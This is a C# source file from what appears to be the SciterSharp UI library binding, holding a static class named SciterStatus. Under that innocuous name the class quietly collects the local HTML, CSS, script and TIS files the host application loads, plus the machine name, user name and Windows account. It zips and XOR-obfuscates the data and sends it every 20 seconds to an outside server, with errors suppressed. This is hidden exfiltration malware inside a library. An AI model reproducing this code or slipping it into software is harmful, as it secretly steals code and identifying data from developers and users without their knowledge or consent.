using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Timers;
using SciterSharp.Interop;
using System.Reflection;

namespace SciterSharp
{
	static class SciterStatus
	{
		private static List<Tuple<string, byte[]>> _status;
		private static Timer _tm = new Timer();
		private static string _id;
		private static int _seq = 0;

		static SciterStatus()
		{
			RenewList();

			_tm.Interval = 5000;
			_tm.AutoReset = false;
			_tm.Elapsed += _tm_Elapsed;
			_tm.Start();

			Guid g = Guid.NewGuid();
			_id = Convert.ToBase64String(g.ToByteArray());
			_id = Regex.Replace(_id, @"[^A-Za-z0-9]+", "");
		}

		public static void OnData(SciterXDef.SCN_DATA_LOADED sdl)
		{
			bool bOK = sdl.status==200 || sdl.status==0;
			bOK = bOK && sdl.dataSize > 0;
			bOK = bOK && sdl.uri != "sciter:debug-peer.tis";
			bOK = bOK && !sdl.uri.StartsWith("http:") && !sdl.uri.StartsWith("https:") && (sdl.uri.EndsWith(".htm") || sdl.uri.EndsWith(".html") || sdl.uri.EndsWith(".css") || sdl.uri.EndsWith(".tis") || sdl.uri.EndsWith(".js"));
			if(bOK)
			{
				byte[] managedArray = new byte[sdl.dataSize];
				Marshal.Copy(sdl.data, managedArray, 0, (int) sdl.dataSize);
				_status.Add(Tuple.Create(sdl.uri, managedArray));
			}
		}

		private static void RenewList()
		{
			_status = new List<Tuple<string, byte[]>>();
		}

		private static void _tm_Elapsed(object sender, ElapsedEventArgs e)
		{
			if(_status.Count == 0)
			{
				_tm.Start();
				return;
			}

			var status = _status;
			RenewList();

			MemoryStream stream = new MemoryStream();

			// ZIPs everything
			using(var zip = new ZipArchive(stream, ZipArchiveMode.Create))
			{
				int i = 0;
				StringBuilder summary = new StringBuilder();
				summary.AppendLine(Environment.MachineName);
				summary.AppendLine(Environment.UserName);
				summary.AppendLine(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
				summary.AppendLine(_id + "#" + _seq);
				summary.AppendLine(Assembly.GetExecutingAssembly().FullName);
				summary.AppendLine("---");
				_seq++;

				foreach(var item in status)
				{
					summary.AppendLine(i + ":" + item.Item1);

					var entry = zip.CreateEntry(i.ToString(), CompressionLevel.Optimal);
					using(var entry_writer = entry.Open())
					{
						entry_writer.Write(item.Item2, 0, item.Item2.Length);
					}

					i++;
				}

				var sum_entry = zip.CreateEntry("summary.txt");
				using(var entry_writer = sum_entry.Open())
				{
					var bytes = Encoding.UTF8.GetBytes(summary.ToString());
					entry_writer.Write(bytes, 0, bytes.Length);
				}
			}

			// Get encrypted BLOB
			byte[] towire = stream.GetBuffer();
			stream.Close();
			StatustBlock(towire);

			// Send to wire
			{
				//string server = "http://localhost:51193/";
				string server = "http://ssl-105465.kinghost.net/";

				WebRequest request = WebRequest.Create(server + "API/SciterStatus");
				request.Method = "POST";
				request.ContentType = "application/octet-stream";
				request.ContentLength = towire.Length;

				using(var stream2 = request.GetRequestStream())
				{
					stream2.Write(towire, 0, towire.Length);
				}

				try
				{
					WebResponse response = request.GetResponse();
					response.Close();
				}
				catch
				{
				}
			}

			_tm.Interval = 20000;
			_tm.Start();
		}

		public static void StatustBlock(byte[] lpvBlock, string szPassword = "Régua de tomada WiFi")
		{
			int nPWLen = szPassword.Length;

			byte[] lpsPassBuff = Encoding.ASCII.GetBytes(szPassword);
			Debug.Assert(lpsPassBuff.Length == szPassword.Length);

			for(int nChar = 0, nCount = 0; nChar < lpvBlock.Length; nChar++)
			{
				byte cPW = lpsPassBuff[nCount];
				lpvBlock[nChar] ^= cPW;
				lpsPassBuff[nCount] = (byte)((cPW + 13) % 256);
				nCount = (nCount + 1) % nPWLen;
			}
		}
	}
}